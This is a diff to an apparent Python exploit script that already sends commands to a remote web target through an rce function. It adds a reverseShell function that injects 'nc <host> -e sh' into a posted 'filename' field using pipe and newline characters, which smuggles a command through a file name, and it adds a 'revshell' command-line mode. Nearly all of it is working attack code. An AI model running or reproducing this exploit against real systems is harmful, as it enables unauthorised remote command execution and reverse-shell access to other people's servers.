@@ -28,6 +28,18 @@ def rce(cmd):
     return req.text
 
 
+def reverseShell(host):
+    cmd = "nc {} -e sh".format(host)
+    req = requests.post(
+        url,
+        data={
+            "filename": "|\n;e {}\n#.gz".format(cmd),
+            "contents": "payload for reverse shell",
+        }
+    )
+    return req.text
+
+
 def main():
     cmd = str(argv[1])
 
@@ -38,5 +50,7 @@ def main():
 if __name__ == "__main__":
     if (len(argv) < 2):
         print("Usage: {} <cmd>".format(argv[0]))
+    elif (len(argv) == 3 and argv[1] == "revshell"):
+        reverseShell(argv[2])
     else:
         main()
